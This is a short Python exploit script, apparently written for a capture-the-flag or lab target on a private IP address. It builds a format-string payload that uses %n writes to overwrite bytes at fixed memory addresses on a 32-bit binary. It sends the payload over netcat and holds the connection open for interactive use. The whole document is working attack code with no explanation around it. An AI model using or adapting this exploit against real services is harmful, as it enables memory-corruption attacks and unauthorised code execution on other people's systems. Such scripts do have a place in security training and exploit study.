import os
import struct

HOST = "192.168.1.74"
PORT = "20011"

def p(x):
    return struct.pack("<L", x)

def create_payload(): 
    
    payload = "%17p"
    payload += "%11\$n"
    payload += "%169p"
    payload += "%12\$n"
    payload += "%35p"
    payload += "%13\$n"
    payload += p(0x0804b4ec)
    payload += p(0x0804b4ed)
    payload += p(0x0804b4ee)
    payload += "%p "*15
    
    return payload

def send_cmd(payload):

    cmd = "(perl -e 'print \""
    cmd += payload
    cmd += "\n\"'; cat) | nc "
    cmd += HOST
    cmd += " "
    cmd += PORT

    os.system(cmd)


payload = create_payload()
send_cmd(payload)
